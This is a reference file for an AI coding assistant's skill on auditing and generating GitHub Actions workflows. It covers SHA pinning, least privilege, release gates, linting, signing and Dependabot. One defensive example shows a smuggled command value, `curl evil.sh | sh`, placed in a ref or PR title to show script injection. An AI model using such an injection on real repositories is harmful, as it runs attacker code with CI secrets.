# GitHub Workflow Reference

This is a reference file — not a standalone skill. It is loaded on demand by
the dev-skills skill (`SKILL.md`) in the same way as `SECURITY_REFERENCE.md`,
`QUALITY_REFERENCE.md`, and `SHELL_REFERENCE.md`. It provides the workflow
selection and audit procedures, the linting rules, and the best practices that
apply to every template. The eight templates themselves are separate
`WORKFLOW_<ENVIRONMENT>.md` files, loaded one at a time by the environment
detection in Step 1 — see "Workflow templates" below. The primary skill decides
when to load this file; this file decides which template comes with it.

**Loaded by the primary skill when:**
- session start (step 6) detects a missing CI build check or release workflow
- the user asks to create, update, or review a GitHub Actions workflow
- the user asks to audit existing workflows ("audit my workflows", "review my
  CI", "check my GitHub Actions")
- Gate 6 needs a release workflow and none exists

---

## Workflow audit

When the user asks to audit, review, or check existing workflows — or when
session start detects workflows that exist but may have issues — read every
`.yml` file in `.github/workflows/` and evaluate each against the
[workflow review checklist](#workflow-review-checklist) below.

### Audit procedure

1. **Discover all workflows:**
   ```
   ls -la .github/workflows/*.yml 2>/dev/null
   ```

2. **Read and classify each workflow:**
   - **Build check** — triggers on `push` or `pull_request` to main branches
   - **Release workflow** — triggers on tag push (`on: push: tags:`)
   - **Deployment** — deploys to infrastructure
   - **Scheduled** — cron-triggered maintenance
   - **Manual** — `workflow_dispatch` only

3. **Run the review checklist** against every workflow. Report findings using
   the same severity levels as the security scan:
   - 🚨 **Critical** — unpinned third-party actions (supply-chain risk),
     secrets echoed in `run:` blocks, `permissions: write-all`, missing
     tag-on-default-branch check in release workflows, missing tag/version
     match check in release workflows (same class of failure: something
     gets published that was never the release), `${{ }}` expression
     interpolated directly into a `run:` script instead of passed through `env:`
   - ⚠️ **High** — `persist-credentials: true` (or missing, which defaults to
     true), no concurrency groups (race conditions), no timeouts (stuck builds
     waste runner minutes), release workflow with `cancel-in-progress: true`
     (can cancel a release mid-flight), release workflow that checks the tag is
     on the default branch but never checks whether CI actually passed for that
     commit
   - 📝 **Medium** — CI reimplements build inline instead of calling project
     scripts, no `set -euo pipefail` in multi-line run blocks, no artifact
     verification after upload, CI trigger is a bare `push:` (also matches tag
     pushes — runs the suite twice on release) instead of `branches: ['**']`,
     no `lint-workflows.yml` for a repo with multiple workflow files, a
     release job re-running a check (lint, shellcheck, full suite) the gate
     job already required CI to have passed for that exact commit
   - 💡 **Low** — missing shellcheck for projects with shell scripts, no
     release notes extraction, actions pinned to version tags instead of SHAs
     (first-party GitHub actions)

4. **Check for missing workflows.** After auditing what exists, check what's
   missing per the environment detection table and report the gaps.

5. **Check for drift.** If both a local dev workflow and CI exist, verify
   that CI calls the project's own scripts rather than reimplementing inline.

6. **Output the audit report:**
   ```
   Workflow audit: .github/workflows/
   
   ci.yml (build check — push/PR)
     ✅ Actions pinned to SHAs
     ✅ persist-credentials: false
     ⚠️ No timeout-minutes on build job
     📝 Build is inline — should call scripts/build.sh
   
   release.yml (release — tag push)
     🚨 Uses actions/checkout@v4 (unpinned version tag)
     ✅ Tag-on-default-branch check present
     ✅ Concurrency group with cancel-in-progress: false
     💡 No shellcheck step
   
   Missing:
     None — both build check and release workflows present
   
   Summary: 1 Critical, 1 High, 1 Medium, 1 Low across 2 workflows
   ```

---

## Workflow selection procedure

When a project needs a workflow, **detect the environment first, then ask all
questions in a single turn.** Do not drip-feed questions across multiple
exchanges — the user should be able to answer everything at once.

### Step 0 — Determine whether code blocks need a `cd`

Presented blocks never carry a `cd`, in any session: every block assumes the
user's terminal is already in the repo, and its label names where to run it
(`SHELL_REFERENCE.md`, "Every presented block"). Don't ask for a clone path.
This applies to every code block produced by this reference file: presented
git commands, workflow file creation commands, and any other terminal
instructions.

### Step 1 — Detect the project environment

Scan the repo for environment signals. Check these in order and pick the
**first match** (a project can match multiple — pick the primary one, note
the others):

| Environment | Signals | Template |
|---|---|---|
| **Docker** | `Dockerfile`, `docker-compose.yml`, `.dockerignore`, `compose.yaml` | `WORKFLOW_DOCKER.md` |
| **Windows app** | `.csproj`, `.sln`, `.vbproj`, `.fsproj`, `*.xaml`, `Setup.iss`, `*.wixproj`, `*.nsis`, MSBuild files | `WORKFLOW_WINDOWS.md` |
| **Android app** | `build.gradle`, `build.gradle.kts`, `settings.gradle`, `AndroidManifest.xml`, `app/` directory with Gradle wrapper | `WORKFLOW_ANDROID.md` |
| **Linux app** | `Makefile`, `CMakeLists.txt`, `meson.build`, `configure.ac`, `.deb`/`.rpm` packaging, `setup.py`/`pyproject.toml` with entry points | `WORKFLOW_LINUX.md` |
| **Home Assistant** | `manifest.json` with `"domain"` key, `hacs.json`, `custom_components/` directory | `WORKFLOW_HOMEASSISTANT.md` |
| **Python package** | `pyproject.toml`, `setup.py`, `setup.cfg` with package metadata | `WORKFLOW_PYTHON.md` |
| **Node.js** | `package.json` with build scripts | `WORKFLOW_NODEJS.md` |
| **Shell scripts** | `*.sh`, `*.bash` files as primary content, no compiled output | `WORKFLOW_SCRIPTS.md` |

If no signal matches, ask what the project is.

**Read only the matching template file(s).** Each is read in full, so loading a
template the project does not match costs the tokens for content that is never
used. A project spanning two environments loads two; never all eight.

### Step 2 — Check for existing workflows

Before suggesting anything, scan `.github/workflows/` for existing files:

```
ls -la .github/workflows/ 2>/dev/null
```

For each existing workflow, read it and classify:
- **Build check** — triggers on `push` or `pull_request` to main branches
- **Release workflow** — triggers on tag push (`on: push: tags:`)
- **Other** — deployment, scheduled, manual dispatch

Report what exists before suggesting additions:

> Found: `.github/workflows/ci.yml` (build check on push/PR)
> Missing: release workflow (no tag-triggered workflow detected)

If both exist and are well-structured, say so and stop — don't suggest
replacements for working workflows.

### Step 3 — Ask all questions in one turn

Based on the detected environment and what's missing, ask everything the user
needs to answer **in a single message.** Use `AskUserQuestion` with all
relevant questions batched together.

**Common questions for all environments:**

1. **Docker registry** (Docker only): Which registry? (Docker Hub / GitHub
   Container Registry / AWS ECR / other)
2. **Artifact attachment** (when ambiguous): Should compiled artifacts be
   attached to the GitHub release for download?
3. **Signing** (Windows / Android): What signing secrets are needed?
   (certificate name, keystore, etc.)
4. **Release notes source**: Extract from CHANGELOG.md, or generate from PR
   description?
5. **Branch protection**: Which branch is the default? (main / master / other)
6. **Dev releases**: Do you want to be able to push pre-release tags from
   feature branches for testing? (e.g., `v1.0.0-dev.1` builds from your
   working branch, marked as pre-release on GitHub)
7. **Workflow linting**: Add `lint-workflows.yml` (runs `actionlint` on
   `.github/workflows/**` changes)? Recommended whenever any workflow is being
   added — see [Workflow linting](#workflow-linting).

**Environment-specific questions to include in the same turn:**

| Environment | Additional questions |
|---|---|
| Docker | Image name? Multi-arch build (amd64/arm64)? |
| Windows | Build tool (MSBuild / dotnet)? Framework version? Installer type (MSI / NSIS / InnoSetup / none)? |
| Linux | Build system (make / cmake / meson / python)? Package format (none / .deb / .rpm / tarball)? |
| Home Assistant | HACS validation needed? Minimum HA version? |
| Android | Min SDK version? Target SDK? Signing keystore configured? Build variant (debug / release)? |
| Scripts | Primary shell (bash / sh / zsh)? Any interpreted languages to lint (Python / Ruby)? |

**Remember answers for the repo.** Once the user answers whether artifacts
should be attached, commit that decision to the CLAUDE.md or project
configuration so it is not asked again. Use the `import-memory` skill or
write the decision to `.claude/settings.json` project memory.

### Step 4 — Generate, validate, and present

After the user answers the Step 3 questions:

1. **Generate the workflow files** from the matching template file, adapted with
   the user's answers (registry, build tool, artifact preference, dev release
   support, etc.)
2. **Run the [review checklist](#workflow-review-checklist)** against the
   generated workflow to catch any missed best practices
3. **Present the files to the user for review** before writing them. Show
   the complete YAML and explain what each section does — this is a teaching
   moment for the citizen coder
4. **Write the files** only after the user approves. Commit discipline
   (Section 1 of SKILL.md) applies — never auto-commit workflow files
5. **Recommend Dependabot** if `.github/dependabot.yml` doesn't exist yet —
   suggest it alongside the new workflows, with an entry for **every ecosystem
   in the repo**, not just `github-actions`
6. **Recommend `lint-workflows.yml`** if it doesn't exist yet — suggest it
   alongside the new workflows, the same way Dependabot is suggested. See
   [Workflow linting](#workflow-linting).

---

## Workflow linting

A dedicated, fast, static-analysis-only workflow for the repo's own
`.github/workflows/**` files: YAML syntax, expression/context typos, job
dependency shape, and a shellcheck pass over `run:` blocks — all via
[`actionlint`](https://github.com/rhysd/actionlint), without starting a
runner environment for the app itself. Offer it whenever a CI or release
workflow is being created or audited, the same way Dependabot is offered —
it's what lets the CI build check safely exclude
`.github/workflows/**` from its own trigger paths without losing coverage for
edits to the workflow files themselves (a broken YAML file or a typo'd
`${{ }}` expression is the common mistake for a workflow edit; actionlint
catches it without waiting for the app's own suite to run).

`actionlint` ships as a binary, not a GitHub Action, so it can't be pinned to
a commit SHA the usual way. Pin the version and verify the release's own
checksum before executing it — download an unpinned or unverified binary and
you're running someone else's code with this job's token:

```yaml
name: Lint workflows

on:
  push:
    branches: ['**']
    paths:
      - '.github/workflows/**'
  pull_request:
    paths:
      - '.github/workflows/**'

jobs:
  actionlint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Download actionlint
        env:
          # Bumped by hand; checksum copied from the release's own
          # *_checksums.txt, not computed after the fact, so a tampered or
          # substituted binary is refused rather than silently trusted.
          ACTIONLINT_VERSION: 1.7.12
          ACTIONLINT_SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
        run: |
          set -euo pipefail
          curl -fsSL -o actionlint.tar.gz \
            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  actionlint.tar.gz" | sha256sum -c -
          tar xzf actionlint.tar.gz actionlint

      - name: Run actionlint
        run: ./actionlint -color
```

**Adaptation notes:**
- Check [actionlint's releases page](https://github.com/rhysd/actionlint/releases)
  for the current version and its published `_checksums.txt` when bumping —
  never write the checksum from memory.
- This workflow is why the CI build check's own trigger can safely carry
  `paths-ignore: ['.github/workflows/**']` (see Reliability, above) — without
  it, that exclusion would leave workflow-file edits completely unchecked.

---

## Template best practices

Every generated workflow MUST follow these practices. They are non-negotiable
and match the patterns already used in this repo's own workflows.

### Security

- **Pin actions to commit SHAs**, not version tags. A version tag is mutable
  and can be repointed. Include the version as a comment:
  ```yaml
  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  ```
  First-party GitHub actions (`actions/*`) should also be pinned to SHAs.
  Third-party and community actions (`docker/*`, etc.) must always be pinned.
  **Exception: `hacs/action`.** HACS's own guidance is to run it unpinned at
  `@main` — the action always validates against HACS's current rules, and a
  pinned snapshot would silently validate against stale ones and pass
  integrations that no longer meet the real requirements. This is the one
  template action left unpinned, and it is intentional, not an oversight.
- **`persist-credentials: false`** on checkout unless the job needs to push.
  Credentials sitting in `.git/config` are attack surface while scripts run.
- **Least-privilege `permissions:`** — declare only what the job needs. Never
  use `permissions: write-all`. Common patterns:
  ```yaml
  permissions:
    contents: read          # build checks
  permissions:
    contents: write         # release creation
    packages: write         # container registry push
    id-token: write         # OIDC trusted publishing (PyPI, cosign)
  ```
- **Prefer OIDC trusted publishing** over API key secrets where supported
  (PyPI, Google Cloud Workload Identity, cosign image signing). Requires
  `id-token: write` permission and a configured environment.
- **Never echo secrets.** Use `${{ secrets.* }}` only in `env:` blocks, never
  in `run:` command strings where they appear in logs. Security-sensitive
  materials (PFX certs, keystores) decoded from secrets must be explicitly
  deleted after use.
- **Verify tag is on the default branch** before releasing. Without this, a
  tag on any commit — including an unreviewed branch — publishes a release
  from unreviewed code:
  ```yaml
  - name: Verify tag is on default branch
    env:
      DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
    run: |
      if ! git merge-base --is-ancestor "$GITHUB_SHA" "origin/$DEFAULT_BRANCH"; then
        echo "Tag $GITHUB_REF_NAME is not on $DEFAULT_BRANCH. Releases come from the default branch only."
        exit 1
      fi
  ```
  **This alone is not enough.** Being on the default branch proves the commit
  was merged — it says nothing about whether CI ever ran against it, or
  passed. A tag pushed against a commit whose CI went red publishes exactly
  the same way a green one does unless something checks the run's conclusion.
  Pair it with a **CI-status gate**, in its own job so the polling step
  carries only the read permissions it needs, never the release job's
  `contents: write`/`packages: write`:
  ```yaml
  jobs:
    gate:
      runs-on: ubuntu-latest
      permissions:
        actions: read
        contents: read
      steps:
        - name: Require a passing CI run for this commit
          env:
            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
            REPO: ${{ github.repository }}
            SHA: ${{ github.sha }}
          run: |
            set -euo pipefail
            runs=$(gh api \
              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
              --jq '.workflow_runs[] | "\(.status) \(.conclusion)"')
            printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }' \
              || { echo "::error::CI never passed for ${SHA}."; exit 1; }
    release:
      needs: gate
      # ...
  ```
  The full version — with a wait loop for a run still in progress, since
  tagging right after pushing the branch is normal and CI takes minutes — is
  in every release template below. Rerunning the whole suite on tag push
  instead would re-prove what the branch push already proved, at the cost of
  the suite's full runtime on every release; asking the API what already
  happened is the cheaper and equally strict check.
- **Verify the tag matches the version declared in the tagged commit.** The
  two checks above prove the commit is *good* — merged, and CI passed for it.
  Neither proves it is the *release*. A tag pushed before its release PR
  merges lands on the previous version's commit, which is already on the
  default branch with CI already green, and passes both checks while
  publishing the old code under the new tag:
  ```yaml
  - name: Verify tag matches the version in the tagged commit
    env:
      TAG: ${{ github.ref_name }}
    run: |
      set -euo pipefail
      version="<extractor for this ecosystem — see the release template below>"
      if [ -z "$version" ]; then
        echo "::error::No version found. Refusing to publish."
        exit 1
      fi
      if [ "v${version}" != "$TAG" ]; then
        echo "::error::Tag $TAG is on a commit that declares ${version}. Merge the release first, then tag the merged commit."
        exit 1
      fi
  ```
  Each release template below has its own extractor for where that
  ecosystem keeps its version — `package.json`, `pyproject.toml`, a manifest,
  a `VERSION` file. Use tools already on the runner; don't add a dependency
  just to read a version string.

  **Tag-derived or computed versions are exempt.** Tools like
  `setuptools-scm` compute the version *from* the tag, so it matches by
  construction — and some Android/Flutter builds derive `versionName` from
  `git describe` or a build variable rather than a literal string in
  `build.gradle`. Don't generate a check that can't fail; say in the
  workflow's comments that the project uses computed versioning instead.

  **A job with no checkout** (a lean gate job that never runs
  `actions/checkout`) can't read the file from disk — fetch it through the
  API at the tagged commit instead:
  ```yaml
  version=$(gh api -H 'Accept: application/vnd.github.raw' \
    "repos/${REPO}/contents/<file>?ref=${SHA}" | <extractor>)
  ```
- **Never interpolate an untrusted or attacker-influenceable value directly
  into a `run:` script.** `${{ github.ref_name }}`, `${{ github.head_ref }}`,
  a PR title, an issue title, or a commit message are template-expanded into
  the script's *text* before the shell ever sees it — a ref or title
  containing `"; curl evil.sh | sh #` becomes code, not data. Read the value
  through `env:` and reference it as a shell variable instead, so it stays a
  string:
  ```yaml
  # bad — the tag name is spliced into the script before bash runs it
  - run: echo "Releasing ${{ github.ref_name }}"

  # good — the tag name arrives as an environment variable's value
  - env:
      TAG: ${{ github.ref_name }}
    run: echo "Releasing $TAG"
  ```
  This matters most for values a fork PR or an external contributor can set
  (PR title, branch name, issue title) — `pull_request_target` combined with
  this pattern is a known path to secret exfiltration and repo write access.
- **Environment protection rules** for release jobs. Use GitHub's
  `environment:` feature with deployment protection rules (approval gates,
  branch restrictions) for publish workflows:
  ```yaml
  jobs:
    publish:
      environment:
        name: production
  ```

### Reliability

- **Concurrency groups** — prevent races on the same branch or tag:
  ```yaml
  concurrency:
    group: ci-${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: true    # for build checks
  concurrency:
    group: release-${{ github.ref }}
    cancel-in-progress: false   # NEVER cancel a release in flight
  ```
- **Timeouts on every job.** A stuck build wastes runner minutes. 10–15 min
  for builds, 5 min for linting, 20 min for Docker multi-arch:
  ```yaml
  jobs:
    build:
      timeout-minutes: 15
  ```
- **Fail explicitly.** Add `set -euo pipefail` at the top of multi-line run
  blocks so a mid-script failure doesn't slide past:
  ```yaml
  - run: |
      set -euo pipefail
      make build
      make test
  ```
- **`branches: ['**']`, not a bare `push:`, on the CI trigger.** A bare
  `push:` also matches a tag push — which is exactly what the release
  workflow's tag trigger fires on — so tagging a commit CI already passed on
  the branch push runs the whole suite a second time against nothing new:
  ```yaml
  on:
    push:
      branches: ['**']   # not just `push:` — that also matches tag pushes
    pull_request:
  ```
- **`paths-ignore` for changes nothing tests reads** (README, CHANGELOG,
  `docs/**`) — but verify what the suite actually reads before excluding a
  path, don't assume. Excluding paths creates an edge case the release gate
  above must handle: a commit that only touched an ignored path has no CI run
  to check. Give the CI workflow a `workflow_dispatch` trigger too, so that
  commit can get a manual run before it's tagged — the gate's error message
  should point at this option.
- **`DEBIAN_FRONTEND=noninteractive` around any `apt-get install`** on an
  `ubuntu-latest` job. Some packages (`wireshark-common`, `tzdata`, others
  with a postinst debconf prompt) ask an interactive question on install; without
  this the step hangs until the job times out instead of failing fast:
  ```yaml
  - name: Install system packages
    env:
      DEBIAN_FRONTEND: noninteractive
    run: sudo apt-get update && sudo apt-get install -y --no-install-recommends <pkg>
  ```
  Runner-dependent, not target-platform-dependent — it applies to any job
  that runs on `ubuntu-latest` and calls `apt-get`, regardless of what OS the
  project itself targets. Windows-runner jobs use a different package manager
  and don't hit this.

### Structure

- **Two workflows, not one.** A build check (CI) and a release workflow serve
  different gates and trigger on different events. Combining them into one file
  with conditional logic is fragile and hard to read.
- **Reuse the project's own scripts.** CI should call `bash scripts/build.sh`
  or `make test`, not reimplement the build inline. When CI and local dev run
  different code, they drift apart until a release breaks.
- **Release notes from CHANGELOG.md** when the project maintains one. Extract
  the section for the current version. Fall back to PR body or auto-generated
  notes only when no changelog exists.

---

## Workflow templates — one file per environment

The eight templates live in their own files so a project loads only the one it
matches. Detect the environment first (Step 1 of the selection procedure
above), then read **only** the matching file — a Node.js project has no use for
the Android template, and each of these is read in full.

| Environment | Template file |
|---|---|
| Docker / container image | `WORKFLOW_DOCKER.md` |
| Windows app (.NET, WPF, WinForms, packaged .exe) | `WORKFLOW_WINDOWS.md` |
| Linux application (binary, .deb/.rpm, AppImage) | `WORKFLOW_LINUX.md` |
| Home Assistant integration / HACS | `WORKFLOW_HOMEASSISTANT.md` |
| Script collection (shell, PowerShell, Python scripts) | `WORKFLOW_SCRIPTS.md` |
| Android app (Gradle, APK/AAB) | `WORKFLOW_ANDROID.md` |
| Python package (PyPI) | `WORKFLOW_PYTHON.md` |
| Node.js / npm package | `WORKFLOW_NODEJS.md` |

A project can span more than one environment — a Python package with a Docker
image, for example. Load each template that matches, and no others.

Everything that applies to *every* template — the best practices above, the
linting rules, dev releases, Cosign signing, and the Dependabot configuration
below — stays in this file and applies to whichever template you load.


## Dev releases

A dev release (pre-release) lets you build and test from a feature branch
without going through the full release process. The user pushes a tag like
`v1.0.0-dev.1` from their working branch, CI builds the artifact, and GitHub
marks the release as a pre-release so it won't be mistaken for a production
release.

This applies to **any** environment template above — not just Android.

**When to use dev releases:**
- Testing a build artifact (APK, binary, Docker image) before merging
- Sharing a work-in-progress build with testers
- Running the full release pipeline as a dry run on a feature branch

**Who pushes the tag.** Same rule as any other tag (`SKILL.md` Section 5.8):
the user pushes it, in both modes, because Claude's credentials are denied on
tag refs. And either way it is a release sequence — a pre-release still builds
and publishes an artifact, so all six gates apply before the tag goes anywhere.

**How it works:**
1. The user pushes a pre-release tag from their feature branch:
   ```bash
   git tag v1.0.0-dev.1
   git push origin v1.0.0-dev.1
   ```
2. The release workflow triggers (it matches `v*`)
3. The tag-on-default-branch check **skips** for pre-release tags
4. The build runs and creates a GitHub release marked as **pre-release**
5. When the feature branch merges and is ready for production, the user
   tags the merge commit with the final version (`v1.0.0`) — that tag
   IS on the default branch and creates a full release

**Tag naming convention:**

| Tag | Meaning | Branch check |
|---|---|---|
| `v1.0.0` | Production release | Must be on default branch |
| `v1.0.0-dev.1` | Development build | Any branch |
| `v1.0.0-alpha.1` | Early testing | Any branch |
| `v1.0.0-beta.1` | Feature-complete testing | Any branch |
| `v1.0.0-rc.1` | Release candidate | Any branch |

**To add dev release support to any template,** modify two places in the
release workflow:

1. **Tag-on-default-branch check** — skip for pre-release tags:
   ```yaml
   - name: Verify tag is on default branch
     env:
       DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
     run: |
       set -euo pipefail
       case "$GITHUB_REF_NAME" in
         *-dev.*|*-alpha.*|*-beta.*|*-rc.*) echo "Pre-release tag — skipping branch check."; exit 0 ;;
       esac
       if ! git merge-base --is-ancestor "$GITHUB_SHA" "origin/$DEFAULT_BRANCH"; then
         echo "Tag $GITHUB_REF_NAME is not on $DEFAULT_BRANCH."
         echo "Releases come from the default branch only."
         echo "Use a pre-release tag (e.g., v1.0.0-dev.1) for feature branch builds."
         exit 1
       fi
   ```

2. **Release creation** — mark pre-releases:
   ```yaml
   - name: Create GitHub release
     env:
       GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     run: |
       set -euo pipefail
       prerelease_flag=""
       case "$GITHUB_REF_NAME" in
         *-dev.*|*-alpha.*|*-beta.*|*-rc.*) prerelease_flag="--prerelease" ;;
       esac
       gh release create "$GITHUB_REF_NAME" \
         --title "$GITHUB_REF_NAME" \
         --notes-file release-notes.md \
         $prerelease_flag
   ```

**When suggesting workflows to the user,** ask whether they want dev release
support as part of the [Step 3 questions](#step-3--ask-all-questions-in-one-turn).
If yes, include the pre-release modifications in the generated workflow.

---

## Advanced: container image signing with Cosign

**What this does:** Cosign signs your Docker image with a cryptographic
signature that proves it came from your CI pipeline. Anyone pulling the image
can verify it was built by GitHub Actions, not tampered with, and came from
your repository. Think of it like a wax seal on a letter — it doesn't change
the contents, but it proves who sent it.

**When to use it:**
- You publish Docker images that others depend on
- Your organization requires supply-chain provenance
- You want to follow SLSA (Supply-chain Levels for Software Artifacts) best
  practices

**Not needed when:**
- The image is only used internally by your own team
- You're just getting started and want to keep things simple (you can always
  add signing later)

To add signing to a Docker release workflow, add these steps after the
`Build and push` step:

```yaml
      # --- Optional: sign the container image with Cosign ---
      # This uses keyless signing via GitHub's OIDC identity — no keys to
      # manage. The signature is recorded in a public transparency log
      # (Rekor) that anyone can verify.

      - name: Install Cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Sign the container image
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: |
          set -euo pipefail
          cosign sign --yes "ghcr.io/${{ github.repository }}@${DIGEST}"
```

**Required changes when adding signing:**
1. Add `id: build` to the `Build and push` step so the digest is accessible
2. Add `id-token: write` to the `permissions:` block (needed for OIDC)
3. Add `attestations: write` and `packages: write` if using attestation

**How users verify the signature:**
```bash
cosign verify \
  --certificate-identity-regexp "https://github.com/OWNER/REPO" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/OWNER/REPO:TAG
```

---

## Keeping action SHAs current with Dependabot

Action SHAs should be updated when new versions are released. Dependabot
automates this — it opens small PRs that bump one action at a time, with the
changelog linked. You review and merge; nothing else changes.

**What it does:** Dependabot watches the versions your repo depends on — both
GitHub Action SHAs and application packages. When a new version is released it
opens a PR with the changelog linked. You review the PR, confirm CI passes, and
merge.

**Recommend adding this file to every project**, and **cover every ecosystem the
repo actually uses, not just `github-actions`.** An actions-only config is the
common mistake: the workflow pins stay current while the application's own
packages drift for months, which is exactly the backlog SKILL.md Section 4.1
exists to prevent. Each ecosystem needs its own `updates:` entry — Dependabot
does not infer them.

### `.github/dependabot.yml`

```yaml
version: 2
updates:
  # 1. GitHub Actions — keeps SHA pins and their version comments current
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Group all action updates into a single PR to reduce noise
    groups:
      actions:
        patterns:
          - "*"

  # 2. Application packages — one entry per ecosystem in the repo.
  #    Replace "npm" with the real one: pip, cargo, gomod, nuget, maven,
  #    gradle, bundler, composer, docker, terraform, ...
  #    `directory` points at the folder holding the manifest/lockfile.
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    groups:
      # Patch and minor bumps ride together: one review, not one risk class.
      # A minor bump can still demand a major toolchain change — only a build
      # settles it. Group for review convenience, never as a risk judgement.
      minor-and-patch:
        update-types:
          - "minor"
          - "patch"
    # Majors stay ungrouped: each is a breaking change with its own gates.
```

**Security updates are a separate feature — this file does NOT configure
them.** `dependabot.yml` controls *version updates*: the scheduled "Bump X
from A to B" PRs above. Advisory-driven *security updates* are repository
settings, not a file — **Settings → Code security → Dependabot alerts** and
**Dependabot security updates**. Both must be turned on, and once they are,
they work from the dependency graph for every ecosystem in the repo, whether
or not that ecosystem has an `updates:` entry here.

A repo with a perfect `dependabot.yml` and alerts left off is current but
unwatched: it gets version churn and zero CVE coverage, which reads as
security maintenance and is not — the "Bump X" PRs above never name a CVE or
GHSA identifier, because they can't; nothing was ever watching for one.
Claude cannot flip a repository setting, so when alerts are disabled
(`GET /repos/{owner}/{repo}/dependabot/alerts` returning `403`) this is a
Gate 3 finding to surface, not something to assume is handled because the
file looks right.

**Adaptation notes:**
- Change `interval` to `"monthly"` for less-active projects
- Remove the `groups` section if you prefer one PR per update (easier to review
  individually but more PRs)
- Add `reviewers:` to assign specific people to review these PRs
- For monorepos, add one entry per manifest location with different `directory:`
  values — a nested `package.json` or `requirements.txt` is invisible to a
  root-only entry
- `ignore:` a specific package only with a stated reason; it silences security
  PRs for it too

**What the PRs look like:**

Dependabot will open PRs like:
> Bump actions/checkout from v7.0.0 to v7.0.1
>
> Updates actions/checkout from 3d3c42e... (v7.0.0) to abc1234... (v7.0.1)
> - [Release notes](link)
> - [Changelog](link)
> - [Commits](link)

The PR updates both the SHA and the version comment automatically.

**Driving a Dependabot PR from an agent: comments don't work.** Posting
`@dependabot rebase` (or `merge`, `squash`) through the GitHub API or an MCP
tool does not trigger Dependabot — the `@` mention arrives with invisible
separators inserted (`·@·d·ependabot`) and Dependabot's own listener never
matches it. The comment posts successfully and nothing happens, which is the
dangerous part: it looks like it worked. Use `update_pull_request_branch`
(GitHub's own "Update branch" action) instead — it merges the base branch in
and fires the push event CI responds to, the same mechanical effect a
`@dependabot rebase` comment was trying to produce.

---

## Integration with the gate reference files

This reference file supports the workflow detection in `SESSION_START.md`
(step 6) and Gate 6 (`SHIP_REFERENCE.md`). When the skill detects a missing
workflow:

1. **Load this file** (`WORKFLOW_REFERENCE.md`)
2. **Run the detection procedure** (Step 1 above)
3. **Ask all questions in one turn** (Step 3 above)
4. **Generate the workflow** from the matching template file, adapted with the
   user's answers
5. **Validate the generated workflow** — check that:
   - All action references use pinned commit SHAs
   - `persist-credentials: false` is set on checkout
   - Concurrency groups are present
   - Timeouts are set on every job
   - The tag-on-default-branch check is present in release workflows
   - The tag/version match check is present in release workflows (or the
     workflow's comments document why the version is tag-derived/computed
     and exempt)
   - Release notes extraction is present
   - The generated workflow calls the project's own build scripts where they
     exist, rather than reimplementing the build inline

### Workflow review checklist

When reviewing an existing workflow (user request or drift detection), check
every item:

- [ ] Actions pinned to commit SHAs (not version tags)
- [ ] Every pinned SHA **resolves to the tag its comment claims** — not just
      present, matching: `git ls-remote <repo> refs/tags/vX.Y.Z` and compare.
      An annotated tag returns two lines — the tag object and, with `^{}`,
      the commit it points to; the pin must be the commit. A pin matching no
      tag at all is broken (CI silently never runs for that job); a pin
      matching a *different* tag than its comment claims is a suppressed
      upgrade — Dependabot reads the comment, not the SHA, to decide what to
      offer next, so a stale label can hide several real versions of drift
- [ ] `persist-credentials: false` on all checkouts
- [ ] Least-privilege `permissions:` block
- [ ] Concurrency groups (cancel-in-progress for CI, never for release)
- [ ] Timeouts on all jobs
- [ ] Tag-on-default-branch verification in release workflows
- [ ] Tag/version match verification in release workflows — the tagged
      commit's own declared version equals the tag, or the version is
      tag-derived/computed and documented as exempt
- [ ] Release notes extracted from CHANGELOG.md or PR body
- [ ] Release job doesn't re-run a check the gate job already required to
      pass on this exact commit (lint, shellcheck, the full test suite) —
      the gate's job is proof it already ran and passed; redoing it in the
      release job burns runner time re-proving what's already known
- [ ] CI calls project's own scripts, not inline reimplementations
- [ ] Secrets used only in `env:` blocks, never in `run:` strings
- [ ] Artifact verification after upload (release workflows)
- [ ] Shell scripts checked with shellcheck (Linux/script projects)
- [ ] `set -euo pipefail` in multi-line run blocks
- [ ] Dependabot configured (`.github/dependabot.yml`) — with an entry for
      GitHub Actions **and** for every package ecosystem the repo uses
- [ ] OIDC trusted publishing used where supported (PyPI, cosign)

---

## Updating action SHA pins

Action SHAs should be updated when new versions are released. The best
approach is [Dependabot](#keeping-action-shas-current-with-dependabot) — it
opens PRs automatically when new action versions are available.

To find the current SHA for a version manually:

```bash
# Get the commit SHA for a specific version tag
git ls-remote https://github.com/actions/checkout.git refs/tags/v7.0.1
```

When updating, always include the version comment:
```yaml
# Before:
- uses: actions/checkout@old-sha  # v7.0.0
# After:
- uses: actions/checkout@new-sha  # v7.0.1
```

---

## Environment-specific artifact rules

These rules determine whether a release MUST have an artifact attached:

| Environment | Artifact required? | Reason |
|---|---|---|
| **Docker** | No (image is pushed to registry) | The artifact IS the pushed image; the GitHub release is just release notes |
| **Windows app** | **Yes — always** | Users download compiled binaries from releases; no other distribution channel |
| **Android app** | **Yes — always** | Users download the APK to install on their device |
| **Linux app (compiled)** | **Yes — always** | Same as Windows — users need the binary |
| **Linux app (interpreted)** | Ask the user | Some projects want a tarball for easy `curl \| tar`; others rely on pip/apt |
| **Home Assistant** | No | HACS pulls directly from the tagged source code |
| **Script collection** | Ask the user | A tarball is convenient but not required; the tagged source is already downloadable |
